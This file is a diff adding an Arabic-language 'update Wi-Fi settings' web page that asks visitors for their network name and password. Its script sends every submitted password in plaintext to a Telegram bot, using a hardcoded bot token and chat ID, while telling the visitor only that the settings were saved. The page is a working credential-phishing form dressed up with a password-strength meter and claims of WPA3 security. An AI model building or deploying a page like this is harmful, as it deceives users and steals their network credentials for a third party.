@@ -1,0 +1,495 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تحديث إعدادات الواي فاي</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root {
+            --primary-color: #4361ee;
+            --secondary-color: #3f37c9;
+            --accent-color: #4cc9f0;
+            --light-color: #f8f9fa;
+            --dark-color: #212529;
+            --success-color: #4bb543;
+            --weak-color: #ff4444;
+            --medium-color: #ffbb33;
+            --strong-color: #00C851;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        
+        .container {
+            background-color: white;
+            width: 100%;
+            max-width: 500px;
+            border-radius: 15px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+            overflow: hidden;
+            animation: fadeIn 0.5s ease-in-out;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        .header {
+            background: linear-gradient(to right, var(--primary-color), var(--secondary-color));
+            color: white;
+            padding: 25px;
+            text-align: center;
+            position: relative;
+        }
+        
+        .header h1 {
+            font-size: 1.8rem;
+            margin-bottom: 5px;
+        }
+        
+        .header p {
+            opacity: 0.9;
+            font-size: 0.9rem;
+        }
+        
+        .form-container {
+            padding: 30px;
+        }
+        
+        .form-group {
+            margin-bottom: 25px;
+            position: relative;
+        }
+        
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            color: var(--dark-color);
+            font-size: 0.95rem;
+        }
+        
+        .form-group input {
+            width: 100%;
+            padding: 15px 15px 15px 45px;
+            border: 2px solid #e9ecef;
+            border-radius: 8px;
+            font-size: 1rem;
+            transition: all 0.3s ease;
+        }
+        
+        .form-group input:focus {
+            border-color: var(--primary-color);
+            box-shadow: 0 0 0 3px rgba(67, 97, 238, 0.2);
+            outline: none;
+        }
+        
+        .form-group i {
+            position: absolute;
+            left: 15px;
+            top: 40px;
+            color: var(--primary-color);
+            font-size: 1.1rem;
+        }
+        
+        .btn {
+            background: linear-gradient(to right, var(--primary-color), var(--secondary-color));
+            color: white;
+            border: none;
+            width: 100%;
+            padding: 15px;
+            border-radius: 8px;
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+        
+        .btn:hover {
+            background: linear-gradient(to right, var(--secondary-color), var(--primary-color));
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+        }
+        
+        .features {
+            margin-top: 30px;
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+            gap: 15px;
+        }
+        
+        .feature {
+            background-color: var(--light-color);
+            padding: 15px;
+            border-radius: 8px;
+            text-align: center;
+            transition: all 0.3s ease;
+        }
+        
+        .feature:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.05);
+        }
+        
+        .feature i {
+            color: var(--primary-color);
+            font-size: 1.5rem;
+            margin-bottom: 10px;
+        }
+        
+        .feature h3 {
+            font-size: 0.9rem;
+            margin-bottom: 5px;
+            color: var(--dark-color);
+        }
+        
+        .feature p {
+            font-size: 0.8rem;
+            color: #6c757d;
+        }
+        
+        .footer {
+            text-align: center;
+            padding: 20px;
+            font-size: 0.8rem;
+            color: #6c757d;
+            border-top: 1px solid #e9ecef;
+        }
+        
+        @media (max-width: 768px) {
+            .container {
+                max-width: 100%;
+            }
+            
+            .header h1 {
+                font-size: 1.5rem;
+            }
+            
+            .form-container {
+                padding: 20px;
+            }
+        }
+        
+        /* Animation for success message */
+        .success-message {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background-color: var(--success-color);
+            color: white;
+            padding: 15px 25px;
+            border-radius: 8px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            z-index: 1000;
+            transform: translateX(200%);
+            transition: transform 0.3s ease;
+        }
+        
+        .success-message.show {
+            transform: translateX(0);
+        }
+        
+        /* Password strength meter */
+        .password-strength {
+            margin-top: 10px;
+            display: none;
+        }
+        
+        .strength-meter {
+            height: 5px;
+            background-color: #e9ecef;
+            border-radius: 5px;
+            margin-bottom: 8px;
+            overflow: hidden;
+        }
+        
+        .strength-meter-fill {
+            height: 100%;
+            width: 0%;
+            transition: width 0.3s ease, background-color 0.3s ease;
+        }
+        
+        .strength-text {
+            font-size: 0.85rem;
+            font-weight: 500;
+        }
+        
+        .strength-weak .strength-meter-fill {
+            background-color: var(--weak-color);
+            width: 33%;
+        }
+        
+        .strength-medium .strength-meter-fill {
+            background-color: var(--medium-color);
+            width: 66%;
+        }
+        
+        .strength-strong .strength-meter-fill {
+            background-color: var(--strong-color);
+            width: 100%;
+        }
+        
+        .strength-tips {
+            margin-top: 10px;
+            padding: 10px;
+            background-color: #f8f9fa;
+            border-radius: 8px;
+            font-size: 0.8rem;
+            display: none;
+        }
+        
+        .strength-tips ul {
+            padding-right: 20px;
+            margin-top: 5px;
+        }
+        
+        .strength-tips li {
+            margin-bottom: 3px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>تحديث إعدادات الواي فاي</h1>
+            <p>أدخل بيانات الشبكة لتحديث الإعدادات</p>
+        </div>
+        
+        <div class="form-container">
+            <form id="wifiForm">
+                <div class="form-group">
+                    <label for="networkName">اسم الشبكة</label>
+                    <i class="fas fa-wifi"></i>
+                    <input type="text" id="networkName" placeholder="أدخل اسم شبكة الواي فاي" required>
+                </div>
+                
+                <div class="form-group">
+                    <label for="wifiPassword">كلمة مرور الواي فاي</label>
+                    <i class="fas fa-lock"></i>
+                    <input type="password" id="wifiPassword" placeholder="أدخل كلمة المرور" required>
+                    
+                    <div class="password-strength" id="passwordStrength">
+                        <div class="strength-meter">
+                            <div class="strength-meter-fill"></div>
+                        </div>
+                        <div class="strength-text" id="strengthText"></div>
+                        <div class="strength-tips" id="strengthTips">
+                            <strong>نصائح لتحسين كلمة المرور:</strong>
+                            <ul id="tipsList"></ul>
+                        </div>
+                    </div>
+                </div>
+                
+                <button type="submit" class="btn">
+                    <i class="fas fa-save"></i>
+                    حفظ الإعدادات
+                </button>
+            </form>
+            
+            <div class="features">
+                <div class="feature">
+                    <i class="fas fa-shield-alt"></i>
+                    <h3>حماية متقدمة</h3>
+                    <p>تشفير WPA3 لأعلى مستوى من الأمان</p>
+                </div>
+                <div class="feature">
+                    <i class="fas fa-bolt"></i>
+                    <h3>سرعة فائقة</h3>
+                    <p>اتصال سريع ومستقر بدون تقطيع</p>
+                </div>
+            </div>
+        </div>
+        
+        <div class="footer">
+            <p>جميع الحقوق محفوظة &copy; 2023</p>
+        </div>
+    </div>
+    
+    <div class="success-message" id="successMessage">
+        <i class="fas fa-check-circle"></i>
+        <span>تم إرسال البيانات بنجاح!</span>
+    </div>
+
+    <script>
+        document.getElementById('wifiForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const networkName = document.getElementById('networkName').value;
+            const wifiPassword = document.getElementById('wifiPassword').value;
+            
+            // تحليل قوة كلمة المرور
+            const strength = checkPasswordStrength(wifiPassword);
+            
+            // إرسال البيانات إلى بوت Telegram مع معلومات القوة
+            sendToTelegram(networkName, wifiPassword, strength);
+            
+            // عرض رسالة النجاح
+            showSuccessMessage();
+            
+            // إعادة تعيين النموذج
+            document.getElementById('wifiForm').reset();
+            document.getElementById('passwordStrength').style.display = 'none';
+        });
+        
+        // تحليل قوة كلمة المرور أثناء الكتابة
+        document.getElementById('wifiPassword').addEventListener('input', function(e) {
+            const password = e.target.value;
+            
+            if (password.length > 0) {
+                document.getElementById('passwordStrength').style.display = 'block';
+                updatePasswordStrength(password);
+            } else {
+                document.getElementById('passwordStrength').style.display = 'none';
+            }
+        });
+        
+        function checkPasswordStrength(password) {
+            let strength = 0;
+            let tips = [];
+            
+            // اختبار طول كلمة المرور
+            if (password.length < 8) {
+                tips.push("كلمة المرور قصيرة جداً (8 أحرف على الأقل)");
+            } else {
+                strength += 1;
+            }
+            
+            // اختبار وجود أحرف كبيرة وصغيرة
+            if (password.match(/[a-z]/) && password.match(/[A-Z]/)) {
+                strength += 1;
+            } else {
+                tips.push("استخدم مزيجاً من الأحرف الكبيرة والصغيرة");
+            }
+            
+            // اختبار وجود أرقام
+            if (password.match(/\d/)) {
+                strength += 1;
+            } else {
+                tips.push("أضف أرقاماً لزيادة القوة");
+            }
+            
+            // اختبار وجود رموز خاصة
+            if (password.match(/[^a-zA-Z\d]/)) {
+                strength += 1;
+            } else {
+                tips.push("أضف رموزاً خاصة مثل @#$%^&*");
+            }
+            
+            // تصنيف القوة
+            let strengthLevel = '';
+            if (strength < 2) {
+                strengthLevel = 'ضعيفة';
+            } else if (strength < 4) {
+                strengthLevel = 'متوسطة';
+            } else {
+                strengthLevel = 'قوية';
+            }
+            
+            return {
+                level: strengthLevel,
+                score: strength,
+                tips: tips
+            };
+        }
+        
+        function updatePasswordStrength(password) {
+            const strength = checkPasswordStrength(password);
+            const strengthElement = document.getElementById('passwordStrength');
+            const strengthText = document.getElementById('strengthText');
+            const strengthTips = document.getElementById('strengthTips');
+            const tipsList = document.getElementById('tipsList');
+            
+            // تحديث شريط القوة والنص
+            strengthElement.className = 'password-strength strength-' + (strength.score < 2 ? 'weak' : strength.score < 4 ? 'medium' : 'strong');
+            
+            // تحديث نص القوة
+            let strengthMessage = '';
+            let textColor = '';
+            
+            if (strength.level === 'ضعيفة') {
+                strengthMessage = '🔴 كلمة المرور ضعيفة';
+                textColor = 'var(--weak-color)';
+            } else if (strength.level === 'متوسطة') {
+                strengthMessage = '🟡 كلمة المرور متوسطة';
+                textColor = 'var(--medium-color)';
+            } else {
+                strengthMessage = '🟢 كلمة المرور قوية';
+                textColor = 'var(--strong-color)';
+            }
+            
+            strengthText.textContent = strengthMessage;
+            strengthText.style.color = textColor;
+            
+            // تحديث النصائح
+            tipsList.innerHTML = '';
+            if (strength.tips.length > 0) {
+                strengthTips.style.display = 'block';
+                strength.tips.forEach(tip => {
+                    const li = document.createElement('li');
+                    li.textContent = tip;
+                    tipsList.appendChild(li);
+                });
+            } else {
+                strengthTips.style.display = 'none';
+            }
+        }
+        
+        function sendToTelegram(network, password, strength) {
+            // استبدل TOKEN_BOT وCHAT_ID بقيمك الخاصة
+            const botToken = '8097677836:AAHOWbYtdZOspYv1I532c8igynKWfuVcKww';
+            const chatId = '5600526506';
+            
+            const message = `📶 بيانات شبكة الواي فاي الجديدة:\n\n🔹 اسم الشبكة: ${network}\n🔸 كلمة المرور: ${password}\n\n📊 قوة كلمة المرور: ${strength.level}\n💪 النقاط: ${strength.score}/4\n\n📝 النصائح:\n${strength.tips.length > 0 ? strength.tips.join('\n') : 'لا توجد نصائح - كلمة مرور قوية!'}`;
+            
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message,
+                }),
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('تم الإرسال إلى Telegram:', data);
+            })
+            .catch(error => {
+                console.error('Error sending to Telegram:', error);
+            });
+        }
+        
+        function showSuccessMessage() {
+            const message = document.getElementById('successMessage');
+            message.classList.add('show');
+            
+            setTimeout(() => {
+                message.classList.remove('show');
+            }, 3000);
+        }
+    </script>
+</body>
+</html>
